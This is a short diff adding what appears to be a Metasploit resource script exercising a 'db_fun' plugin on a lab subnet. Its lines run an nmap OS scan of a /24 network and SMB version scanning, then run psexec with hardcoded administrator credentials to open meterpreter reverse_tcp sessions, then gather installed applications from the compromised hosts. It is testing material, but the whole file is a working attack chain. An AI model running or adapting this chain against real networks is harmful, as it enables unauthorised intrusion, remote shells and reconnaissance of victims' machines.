@@ -1,0 +1,16 @@
+# exercise db_fun
+
+hosts -d *
+hosts
+load db_fun
+db_fun_debug false
+db_search hosts
+db_nmap -O 192.168.170.1/24
+db_search hosts
+db_set_create newly_discovered
+db_set_run_module newly_discovered scanner/smb/smb_version
+db_set_auto
+db_set_run_module windows windows/smb/psexec windows/meterpreter/reverse_tcp SMBUser=administrator SMBPass=lab
+db_search sessions where closed_at=nil
+db_set_run_module post/windows/gather/enum_applications
+
